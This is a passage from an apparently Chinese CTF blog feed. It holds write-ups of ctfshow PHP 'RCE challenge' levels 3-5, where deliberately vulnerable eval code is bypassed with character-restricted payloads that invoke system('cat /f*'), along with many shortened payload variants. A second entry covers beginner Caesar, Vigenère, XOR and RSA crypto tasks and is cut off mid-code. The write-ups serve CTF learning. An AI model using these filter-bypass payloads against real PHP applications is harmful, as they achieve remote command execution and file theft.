class="line">ctf_show=%24_%3D%5B%5D%3B%24_%20%3D%20&#x27;&#x27;.%24_%3B%24_%3D%24_%5B&#x27;!&#x27;%3D%3D&#x27;%3B&#x27;%5D%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24__%3D%24_%3B%24_%2B%2B%3B%24_%2B%2B%3B%24__%3D%24_.%24__%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24__%3D&#x27;_&#x27;.%24__.%24_%3B(%24%24__%5B&#x27;_&#x27;%5D)(%24%24__%5B&#x27;__&#x27;%5D)%3B</span><br></pre></td></tr></table></figure><h2 id="RCE挑战3"><a href="#RCE挑战3" class="headerlink" title="RCE挑战3"></a>RCE挑战3</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//本题灵感来自研究Y4tacker佬在吃瓜杯投稿的shellme时想到的姿势，太棒啦~。</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$ctfshow</span>) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$ctfshow</span>) &lt;= <span class="number">105</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z2-9!&#x27;@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>,<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;Are you hacking me AGAIN?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>fuzz后发现可用的可见字符有：</p><p>$ ( ) + , . / 0 1 ; = [ ] _  </p><p>并且代码长度限制要小于105。</p></blockquote><p>可以用数字0或者1，那么就可以通过(0/0)来构造float型的NAN，(1/0)来构造float型的INF，然后转换成字符串型，得到”NAN”和”INF”中的字符了，</p><p>exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=((<span class="number">0</span>/<span class="number">0</span>)._)[<span class="number">0</span>]; <span class="comment">//这里是关键，php的计算上面有说，返回N</span></span><br><span class="line"><span class="variable">$_</span>++; <span class="comment">//O</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>.<span class="variable">$_</span>++; </span><br><span class="line"><span class="comment">//这里是进行了++的，所以$_等于P, $__=PO。</span></span><br><span class="line"><span class="variable">$_</span>++; <span class="comment">// Q</span></span><br><span class="line"><span class="variable">$_</span>++; <span class="comment">// R</span></span><br><span class="line"><span class="variable">$_</span>++; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$_</span>=_.<span class="variable">$__</span>.<span class="variable">$_</span>.++<span class="variable">$_</span>; <span class="comment">//这里最后一个也是进行了++的，所以最后一位是T, $_ = _POST</span></span><br><span class="line"><span class="variable">$$_</span>[_](<span class="variable">$$_</span>[<span class="number">0</span>]); <span class="comment">// $_POST[_]($_POST[0]);</span></span><br></pre></td></tr></table></figure><p>至于为什么使用POST，因为N下面就有post的所有字母，而且比较近，而且php的ascii不能自减，所以组GET要废很多时间。</p><p>playload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf_show=$_=((0/0)._)[0];$_++;$__=$_.$_++;$_++;$_++;$_++;$_=_.$__.$_.++$_;$$_[_]($$_[0]);&amp;_=system&amp;0=cat /f*</span><br></pre></td></tr></table></figure><h2 id="RCE挑战4"><a href="#RCE挑战4" class="headerlink" title="RCE挑战4"></a>RCE挑战4</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//本题灵感来自研究Y4tacker佬在吃瓜杯投稿的shellme时想到的姿势，太棒啦~。</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$ctfshow</span>) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$ctfshow</span>) &lt;= <span class="number">84</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z1-9!&#x27;@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>,<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;Are you hacking me AGAIN?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>fuzz一下，发现可用的字符只有</p><p>$ ( ) + , . / 0 ; = [ ] _</p><p>要求长度小于84</p></blockquote><p>exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=(_/_._)[<span class="number">0</span>]; <span class="comment">//更短的N</span></span><br><span class="line"><span class="variable">$_</span>++; <span class="comment">//O</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>.<span class="variable">$_</span>++; </span><br><span class="line"><span class="comment">//这里是进行了++的，所以$_等于P, $__=PO.</span></span><br><span class="line"><span class="variable">$_</span>++; <span class="comment">// Q</span></span><br><span class="line"><span class="variable">$_</span>++; <span class="comment">// R</span></span><br><span class="line"><span class="variable">$_</span>++; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$_</span>=_.<span class="variable">$__</span>.<span class="variable">$_</span>.++<span class="variable">$_</span>; <span class="comment">//这里最后一个也是进行了++的，所以最后一位是T, $_ = _POST</span></span><br><span class="line"><span class="variable">$$_</span>[_](<span class="variable">$$_</span>[<span class="number">1</span>]); <span class="comment">// $_POST[_]($_POST[1]);</span></span><br></pre></td></tr></table></figure><p>RCE挑战3的playload也能用，但是又尝试压到了78个字符。</p><p>playload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf_show=$_=(_/_._)[0];$_++;$__=$_.$_++;$_++;$_++;$_++;$_=_.$__.$_.++$_;$$_[_]($$_[0]);&amp;_=system&amp;0=cat /f*</span><br></pre></td></tr></table></figure><h2 id="RCE挑战5"><a href="#RCE挑战5" class="headerlink" title="RCE挑战5"></a>RCE挑战5</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//本题灵感来自研究Y4tacker佬在吃瓜杯投稿的shellme时想到的姿势，太棒啦~。</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$ctfshow</span>) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$ctfshow</span>) &lt;= <span class="number">73</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9!&#x27;@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>,<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;Are you hacking me AGAIN?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>限制73个字符，而且0也不可以用了</p><p><code>$_=(_/_._)[_];$_++;$__=$_.$_++;$_++;$_++;$_++;$_=_.$__.++$_.++$_;$$_[_]($$_[0]);</code></p><p>重新fuzz，变量这边还能再缩，尝试一些希腊字符等不可见字符。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$%FF=<span class="title function_ invoke__">_</span>(%FF/%FF)[%FF];<span class="comment">//N</span></span><br><span class="line"><span class="variable">$_</span>=++$%FF; <span class="comment">//O</span></span><br><span class="line"><span class="variable">$_</span>=_.++$%FF.<span class="variable">$_</span>;<span class="comment">//_PO</span></span><br><span class="line">$%FF++;<span class="comment">//Q</span></span><br><span class="line">$%FF++;<span class="comment">//R</span></span><br><span class="line"><span class="variable">$_</span>.=++$%FF.++$%FF;<span class="comment">//_POST</span></span><br><span class="line"><span class="variable">$$_</span>[%FF](<span class="variable">$$_</span>[_]);</span><br></pre></td></tr></table></figure><p>极限的73个字符。</p><p>看别的师傅的wp，PHP在做字符串拼接的过程中（.操作），是一个从左到右递归的过程，而<code>++</code>操作类似于一个函数，php在执行完函数后，再做拼接的操作，这里可以<code>$_=$a.$a++;</code>来拼接PO。</p><p>预期解：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">_</span>(a/a)[a];<span class="comment">//相当于gettext(0/0)[0],得到N</span></span><br><span class="line"><span class="variable">$_</span>=++<span class="variable">$a</span>;<span class="comment">//O</span></span><br><span class="line"><span class="variable">$_</span>=_.++<span class="variable">$a</span>.<span class="variable">$_</span>;<span class="comment">//_PO</span></span><br><span class="line"><span class="variable">$a</span>++;<span class="variable">$a</span>++;<span class="comment">//R</span></span><br><span class="line"><span class="variable">$_</span>.=++<span class="variable">$a</span>.++<span class="variable">$a</span>;<span class="comment">//_POST</span></span><br><span class="line"><span class="variable">$$_</span>[a](<span class="variable">$$_</span>[_]);<span class="comment">//$_POST[a]($_POST[_])</span></span><br></pre></td></tr></table></figure><p>这里观察到phpinfo安装了一个扩展gettext，该扩展支持函数<code>_()</code> ,相当于<code>gettext()</code>，直接转化为字符串。另外，其实数组下标使用未定义常量，php会warning，但是可以继续运行，并返回下标为0的字符（现象是这样但是实际机制需要看php源码）。其余知识点上面都已经讲过了，剩下的就是靠经验和积累对payload进行精简。</p><p>playload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf_show=$%ff=_(%ff/%ff)[%ff];$_=%2b%2b$%ff;$_=_.%2b%2b$%ff.$_;$%ff%2b%2b;$%ff%2b%2b;$_.=%2b%2b$%ff.%2b%2b$%ff;$$_[_]($$_[%ff]);&amp;_=system&amp;%ff=cat /f*</span><br></pre></td></tr></table></figure><p>大佬们的不同长度playload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//$_=[].[];$__=&#x27;&#x27;;$_=$_[&#x27;&#x27;];$_=++$_;$_=++$_;$_=++$_;$_=++$_;$__.=$_;$_=++$_;$_=++$_;$__=$_.$__;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$__.=$_;$___=&#x27;_&#x27;;$___.=$__;($$___[_])($$___[__]);</span></span><br><span class="line"><span class="comment">//246</span></span><br><span class="line"><span class="comment">//$_=[].[];$__=&#x27;&#x27;;$_=$_[&#x27;&#x27;];$_=++$_;$_=++$_;$_=++$_;$_=++$_;$__.=$_;$_=++$_;$_=++$_;$__=$_.$__;$_=($_/$_.$_)[&#x27;&#x27;];$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$__.=$_;$___=&#x27;_&#x27;;$___.=$__;($$___[_])($$___[__]);</span></span><br><span class="line"><span class="comment">//208</span></span><br><span class="line"><span class="comment">//$_=[].[];$__=&#x27;&#x27;;$_=$_[&#x27;&#x27;];$_=($_/$_.$_)[&#x27;&#x27;];$_=++$_;$__.=$_;$_=++$_;$__=$_.$__;$_=++$_;$_=++$_;$_=++$_;$__.=$_;$_=++$_;$__.=$_;$___=&#x27;_&#x27;;$___.=$__;$__=$$___;$__[&#x27;_&#x27;]($__[&#x27;__&#x27;]);</span></span><br><span class="line"><span class="comment">//176</span></span><br><span class="line"><span class="comment">//$_=[].[];$_=$_[&#x27;&#x27;];$_=($_/$_.$_)[&#x27;&#x27;];$_++;$__.=$_;$_++;$__=$_.$__;$_++;$_++;$_++;$__.=$_;$_=_.$__.++$_;($_[_])($_[__]);</span></span><br><span class="line"><span class="comment">//119</span></span><br><span class="line"><span class="comment">//$_=[].[];$_=$_[&#x27;&#x27;];$_=($_/$_.$_)[&#x27;&#x27;];$_++;$__=$_;$_++;$___=$_;$_++;$_++;$_++;$_=_.$___.$__.$_.++$_;($$_[_])($$_[__]);</span></span><br><span class="line"><span class="comment">//117</span></span><br><span class="line"><span class="comment">//$_=[].[];$_=$_[&#x27;&#x27;];$_=($_/$_.$_)[&#x27;&#x27;];$_++;$__=$_;$_++;$__=$_.$__;$_++;$_++;$_++;$_=_.$__.$_.++$_;$$_[_]($$_[__]);</span></span><br><span class="line"><span class="comment">//113</span></span><br><span class="line"><span class="comment">//$_=([].[])[&#x27;&#x27;];$_=($_/$_.$_)[&#x27;&#x27;];$_++;$__=$_;$_++;$__=$_.$__;$_++;$_++;$_++;$_=_.$__.$_.++$_;$$_[_]($$_[__]);</span></span><br><span class="line"><span class="comment">//109</span></span><br><span class="line"><span class="comment">//$_=([].[])[0];$_=($_/$_.$_)[0];$_++;$__=$_.$_++;$_++;$_++;$_++;$_=_.$__.$_.++$_;$$_[_]($$_[1]);</span></span><br><span class="line"><span class="comment">//95</span></span><br><span class="line"><span class="comment">//$_=(0/0).[];$_=$_[0];$_++;$__=$_.$_++;$_++;$_++;$_++;$_=_.$__.$_.++$_;$$_[_]($$_[0]);</span></span><br><span class="line"><span class="comment">//85</span></span><br><span class="line"><span class="comment">//$_=((0/0).[])[0];$_++;$__=$_.$_++;$_++;$_++;$_++;$_=_.$__.$_.++$_;$$_[_]($$_[0]); </span></span><br><span class="line"><span class="comment">//82</span></span><br><span class="line"><span class="comment">//$_=((_/_).[])[_];$_++;$__=$_.$_++;$_++;$_++;$_++;$_=_.$__.$_.++$_;$$_[_]($$_[__]);</span></span><br><span class="line"><span class="comment">//82</span></span><br><span class="line"><span class="comment">//$_=(_/_._)[_];$_++;$__=$_.$_++;$_++;$_++;$_++;$_=_.$__.$_.++$_;$$_[_]($$_[__]);</span></span><br><span class="line"><span class="comment">//79</span></span><br><span class="line"><span class="comment">//$_=(_/_._)[_];$_++;$__=$_.$_++;$_++;$_++;$_++;$_=_.$__.$_.++$_;$$_[_].$$_[__];</span></span><br><span class="line"><span class="comment">//78</span></span><br><span class="line"><span class="comment">//$_=(_/_._)[_];$_++;$α=$_.$_++;$_++;$_++;$_++;$_=_.$α.$_.++$_;$$_[_]($$_[__]);</span></span><br><span class="line"><span class="comment">//77</span></span><br><span class="line"><span class="comment">//$_=(_/_._)[_];$_++;$%FA=$_.$_++;$_++;$_++;$_=_.$%FA.++$_.++$_;$$_[_]($$_[%FA]);</span></span><br><span class="line"><span class="comment">//73</span></span><br></pre></td></tr></table></figure><p>62位写法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?PHP</span><br><span class="line">$_=_(%FA.%FA)[_];//N</span><br><span class="line">$%FA=++$_;//O</span><br><span class="line">$$%FA[$%FA=_.++$_.$%FA[$_++/$_++].++$_.++$_]($$%FA[_]); //$_POST[_POST]($_POST[_])</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RCE </tag>
            
            <tag> ctfshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Newstart CTF Week1-Wirteup</title>
      <link href="/posts/fd3e.html"/>
      <url>/posts/fd3e.html</url>
      
        <content type="html"><![CDATA[<h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="caeser"><a href="#caeser" class="headerlink" title="caeser"></a>caeser</h2><p>synt{uvfgbevpny_pvcure_vf_ihyarenoyr}提示凯撒加密，直接穷举得到flag。<br>flag{historical_cipher_is_vulnerable}</p><h2 id="吉奥万·巴蒂斯塔·贝拉索先生的密码"><a href="#吉奥万·巴蒂斯塔·贝拉索先生的密码" class="headerlink" title="吉奥万·巴蒂斯塔·贝拉索先生的密码"></a>吉奥万·巴蒂斯塔·贝拉索先生的密码</h2><p>pqcq{gteygpttmj_kc_zuokwv_kqb_gtofmssi_mnrrjt}<br>Hint: key length is 3<br>题目讲的就是Vigenère cipher，一把梭。<br>flag{bruteforce_is_useful_for_breaking_cipher}</p><h2 id="eazyxor"><a href="#eazyxor" class="headerlink" title="eazyxor"></a>eazyxor</h2><p>xor.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> urandom</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">key = urandom(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">plaintext, key</span>):</span><br><span class="line">  ret = []</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(plaintext)):</span><br><span class="line">      ret.append(plaintext[i] ^ key[<span class="number">0</span>])</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">bytes</span>(ret)</span><br><span class="line"></span><br><span class="line">ciphertext = xor(flag, key)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(ciphertext.<span class="built_in">hex</span>())</span><br></pre></td></tr></table></figure><p>output.txt:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">9b919c9a8685cd8fa294c8a28c88cc89cea2ce9c878480</span><br></pre></td></tr></table></figure><p>urandom(1)就是随机生成一个字符串 赋值给key<br>密文由xor(flag,key)生成的。xor函数就是遍历flag将每一位与key异或，密文以16进制输出。<br>思路：<br>一个数异或另一个数两次返回本身，那么思路就是找出这个key。<br>我们已知明文前缀为flag{，那么可以把前缀与密文的16进制进行异或，得到key为253</p><p><img src="https://s2.loli.net/2023/08/04/WRMXxz1LfCY6JOh.png" alt="image-20221005214858218.png"></p><p>exp.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">key = <span class="number">253</span></span><br><span class="line">cipher = <span class="string">&#x27;9b919c9a8685cd8fa294c8a28c88cc89cea2ce9c878480&#x27;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(cipher),<span class="number">2</span>):</span><br><span class="line">    flag += <span class="built_in">chr</span>(<span class="built_in">int</span>(cipher[i:i+<span class="number">2</span>],<span class="number">16</span>) ^ key)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>flag{x0r_i5_qu1t3_3azy}</p><h2 id="RSA-begin"><a href="#RSA-begin" class="headerlink" title="RSA_begin"></a>RSA_begin</h2><p>task.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag) % <span class="number">5</span> == <span class="number">0</span></span><br><span class="line">cnt = <span class="built_in">len</span>(flag) // <span class="number">5</span></span><br><span class="line">flags = [flag[cnt*i:cnt*(i+<span class="number">1</span>)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># Try to implement your RSA with primes p and q</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">level1</span>(<span class="params">message</span>):</span><br><span class="line">    m = bytes_to_long(message)</span><br><span class="line">    p = getPrime(<span class="number">512</span>)</span><br><span class="line">    q = getPrime(<span class="number">512</span>)</span><br><span class="line">    n = p * q</span><br><span class="line">    e = <span class="number">0x10001</span></span><br><span class="line">    <span class="keyword">assert</span> m &lt; n</span><br><span class="line">    c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;p = <span class="subst">&#123;p&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;q = <span class="subst">&#123;q&#125;</span>&#x27;</span>)</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># But how can we attack the RSA when we didn&#x27;t know the primes?</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">level2</span>(<span class="params">message</span>):</span><br><span class="line">    m = bytes_to_long(message)</span><br><span class="line">    p = getPrime(<span class="number">64</span>)</span><br><span class="line">    q = getPrime(<span class="number">64</span>)</span><br><span class="line">    n = p * q</span><br><span class="line">    e = <span class="number">0x10001</span></span><br><span class="line">    <span class="keyword">assert</span> m &lt; n</span><br><span class="line">    c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;n = <span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line">  </span><br><span class="line">  